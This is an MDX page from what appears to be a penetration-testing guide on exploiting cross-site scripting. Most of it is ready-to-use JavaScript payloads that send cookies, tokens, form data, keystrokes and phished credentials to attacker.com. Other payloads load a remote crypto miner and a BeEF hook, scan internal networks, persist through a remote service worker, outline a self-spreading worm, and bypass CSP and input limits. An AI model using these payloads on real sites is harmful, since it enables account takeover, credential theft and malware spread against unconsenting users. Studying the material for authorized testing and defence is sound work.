---
title: XSS Exploitation Strategies
description: Advanced techniques for exploiting Cross-Site Scripting vulnerabilities
---

import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"
import { Callout } from "@/components/markdown/callout"


Once you've identified an XSS vulnerability, understanding how to effectively exploit it is crucial for demonstrating its impact during security assessments. This section covers various exploitation techniques and their potential security implications.

<Callout type="warning" title="Ethical Considerations">
  These techniques should only be used in controlled environments with proper authorization. Unauthorized exploitation of XSS vulnerabilities is illegal and unethical.
</Callout>

## Session Hijacking

One of the most common goals of XSS exploitation is session hijacking, which allows an attacker to take over a victim's session.

<Tabs defaultValue="cookie-theft" className="pt-5 pb-1">
  <TabsList>
    <TabsTrigger value="cookie-theft">Cookie Theft</TabsTrigger>
    <TabsTrigger value="session-riding">Session Riding</TabsTrigger>
    <TabsTrigger value="token-theft">Token Theft</TabsTrigger>
  </TabsList>
  <TabsContent value="cookie-theft">
    ### Cookie Theft
    
    This technique involves stealing the victim's cookies and sending them to an attacker-controlled server:
    
    ```javascript
    // Basic cookie stealing payload
    <script>
      fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
    </script>
    ```
    
    **Modern Approach with Fetch API:**
    ```javascript
    <script>
      fetch('https://attacker.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({cookies: document.cookie, url: location.href})
      });
    </script>
    ```
    
    **Limitations:**
    - HttpOnly cookies cannot be accessed via JavaScript
    - Secure cookies are only sent over HTTPS connections
    - SameSite cookie attribute can prevent CSRF attacks
  </TabsContent>
  <TabsContent value="session-riding">
    ### Session Riding (CSRF via XSS)
    
    Instead of stealing cookies, this technique performs actions on behalf of the victim:
    
    ```javascript
    // Example: Changing user's email address
    <script>
      fetch('/api/update-profile', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          // Cookies are automatically included
        },
        body: JSON.stringify({
          email: 'attacker@evil.com'
        })
      });
    </script>
    ```
    
    This approach works even with HttpOnly cookies since the browser automatically includes cookies in the request.
  </TabsContent>
  <TabsContent value="token-theft">
    ### Token Theft
    
    Modern applications often store authentication tokens in localStorage or sessionStorage:
    
    ```javascript
    // Stealing tokens from storage
    <script>
      const token = {
        localStorage: localStorage.getItem('auth_token'),
        sessionStorage: sessionStorage.getItem('auth_token'),
        jwt: document.cookie.match(/jwt=([^;]+)/)?.[1]
      };
      
      fetch('https://attacker.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(token)
      });
    </script>
    ```
    
    **Advantage:** Can bypass HttpOnly cookie protections if tokens are stored in localStorage.
  </TabsContent>
</Tabs>

## Data Exfiltration

XSS can be used to steal sensitive information from the page or the user's account.

### Stealing Visible Page Content

```javascript
<script>
  // Grab sensitive information from the page
  const userData = {
    username: document.querySelector('.username')?.textContent,
    email: document.querySelector('.email')?.textContent,
    accountDetails: document.querySelector('#account-details')?.innerHTML
  };
  
  fetch('https://attacker.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(userData)
  });
</script>
```

### Stealing Form Data

```javascript
<script>
  // Monitor form submissions
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
      const formData = new FormData(form);
      const data = {};
      for (let [key, value] of formData.entries()) {
        data[key] = value;
      }
      
      // Send form data to attacker
      fetch('https://attacker.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      });
    });
  });
</script>
```

### Keylogging

```javascript
<script>
  let buffer = '';
  document.addEventListener('keypress', function(e) {
    buffer += e.key;
    if (buffer.length >= 10) {
      fetch('https://attacker.com/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({keystrokes: buffer})
      });
      buffer = '';
    }
  });
</script>
```

## Advanced Exploitation Techniques

### Virtual Defacement

Modify the appearance of a website without actually changing server-side content:

```javascript
<script>
  // Change website logo
  document.querySelectorAll('img').forEach(img => {
    if (img.src.includes('logo')) {
      img.src = 'https://attacker.com/hacked-logo.png';
    }
  });
  
  // Change text content
  document.body.innerHTML = document.body.innerHTML.replace(
    /Welcome to/g, 
    'Site hacked by Hackers - Welcome to'
  );
  
  // Add overlay
  const overlay = document.createElement('div');
  overlay.style = 'position:fixed;top:0;left:0;width:100%;height:100px;background:red;color:white;text-align:center;z-index:9999;';
  overlay.innerHTML = '<h1>This site has been hacked!</h1>';
  document.body.prepend(overlay);
</script>
```

This technique creates the appearance of a hack without actually modifying server-side files.

### Phishing via XSS

Create fake login forms to steal credentials:

```javascript
<script>
  // Create a fake login overlay
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:10000;display:flex;align-items:center;justify-content:center;">
      <div style="background:white;padding:20px;border-radius:5px;width:300px;">
        <h2>Session Expired</h2>
        <p>Please log in again to continue</p>
        <form id="fake-login">
          <div style="margin:10px 0;">
            <label>Username:</label>
            <input type="text" name="username" style="width:100%;padding:5px;">
          </div>
          <div style="margin:10px 0;">
            <label>Password:</label>
            <input type="password" name="password" style="width:100%;padding:5px;">
          </div>
          <button type="submit" style="background:#0066cc;color:white;padding:8px 15px;border:none;border-radius:3px;">Login</button>
        </form>
      </div>
    </div>
  `;
  
  // Capture submitted credentials
  document.getElementById('fake-login').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = this.elements.username.value;
    const password = this.elements.password.value;
    
    fetch('https://attacker.com/credentials', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({username, password})
    }).then(() => {
      // Redirect to the real login page to avoid suspicion
      window.location = '/login?session_expired=true';
    });
  });
</script>
```

This creates a convincing overlay that appears to be from the legitimate site.

### Cryptocurrency Mining

Use the victim's CPU to mine cryptocurrency:

```javascript
<script>
  // Load mining script from remote server
  const script = document.createElement('script');
  script.src = 'https://attacker.com/crypto-miner.js';
  document.body.appendChild(script);
</script>
```

The remote script would contain the actual mining code, often using WebAssembly for performance.

**Impact:**
- Drains battery life
- Slows down the victim's device
- Generates revenue for the attacker

### Internal Network Scanning

Use the victim's browser to scan internal networks:

```javascript
<script>
  // Scan internal network for common devices/services
  const internalIPs = ['192.168.0.1', '192.168.1.1', '10.0.0.1'];
  const ports = [80, 8080, 8443, 3389];
  
  internalIPs.forEach(ip => {
    ports.forEach(port => {
      const img = new Image();
      const startTime = new Date().getTime();
      
      img.onerror = function() {
        const endTime = new Date().getTime();
        const responseTime = endTime - startTime;
        
        // If response is quick, port is likely closed
        // If response is slow, port might be open (filtered)
        if (responseTime > 2) {
          fetch('https://attacker.com/scan-result', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ip, port, status: 'potential'})
          });
        }
      };
      
      img.src = `http://${ip}:${port}/favicon.ico?${Math.random()}`;
    });
  });
</script>
```

This technique can reveal internal network topology and potentially accessible services.

## Weaponizing XSS with Frameworks

Several frameworks exist to help exploit XSS vulnerabilities more effectively:

### BeEF (Browser Exploitation Framework)

BeEF is a powerful tool that focuses on exploiting web browsers through XSS:

```javascript
<script src="http://attacker-ip:3000/hook.js"></script>
```

Once a browser is "hooked," BeEF provides capabilities such as:

- Detailed browser fingerprinting
- Social engineering attacks
- Network discovery
- Integration with Metasploit
- Persistent access to the compromised browser

### XSS-Payload-List

This is a collection of XSS payloads for various attack scenarios:

```javascript
// Redirect to a phishing page
location.href = 'https://attacker.com/fake-login';

// Load a BeEF hook
document.body.appendChild(document.createElement('script')).src='http://attacker-ip:3000/hook.js';

// Create a keylogger
window.addEventListener('keydown', function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
});
```

## Persistent Attack Techniques

### DOM Persistence

Keep the XSS attack running even after the initial page is closed:

```javascript
<script>
  // Store the payload in localStorage
  localStorage.setItem('theme_preference', '</script><script>alert("XSS persisted")</script>');
  
  // Create a service worker for persistence
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('https://attacker.com/evil-worker.js');
  }
</script>
```

### Self-Propagating XSS (XSS Worms)

Create XSS attacks that spread to other users:

```javascript
<script>
  // Get all friends from the page
  const friends = Array.from(document.querySelectorAll('.friend-link')).map(a => a.href);
  
  // The payload to spread
  const payload = encodeURIComponent('<script>/* Malicious code here */</script>');
  
  // Send message with payload to each friend
  friends.forEach(friend => {
    fetch(`/send-message?to=${friend}&message=${payload}`);
  });
</script>
```

<Callout type="danger" title="High Impact">
  Self-propagating XSS can spread rapidly and affect many users. These attacks are particularly dangerous and should never be deployed on production systems without explicit permission.
</Callout>

## Exploitation Challenges and Solutions

### Bypassing Character Limitations

When input length is restricted:

```javascript
// Short payload using eval
<svg onload=eval(location.hash.slice(1))>

// Then in the URL:
// https://vulnerable-site.com/page#fetch('https://attacker.com/s?c='+document.cookie)
```

### Working with Content Security Policy

When CSP is implemented:

```javascript
// If unsafe-inline is allowed
<script>alert(1)</script>

// If only specific scripts are allowed via nonce or hash
// Look for JSONP endpoints on allowed domains:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>

// If DOM manipulation is possible:
<img src=x onerror="document.body.innerHTML='<h1>Hacked</h1>'">
```

### Limited Input Contexts

When XSS is only possible in specific contexts:

```javascript
// Inside an attribute
" onmouseover="alert(1)" x="

// Inside JavaScript
";alert(1);//

// Inside CSS
</style><script>alert(1)</script>
```

## Proof of Concept Development

When reporting XSS vulnerabilities, it's important to create a safe proof of concept:

```javascript
// Safe PoC using alert() with origin information
<script>
  alert('XSS vulnerability on ' + location.hostname + '\n' + 
        'Current user: ' + document.querySelector('.username')?.textContent);
</script>

// Alternative using console.log for less intrusive demonstration
<script>
  console.log('XSS vulnerability found');
  console.log('Domain:', location.hostname);
  console.log('Path:', location.pathname);
  console.log('User context:', document.cookie.includes('admin=true') ? 'Admin' : 'Regular user');
</script>
```

In the next section, we'll explore evasion techniques to bypass XSS protections.
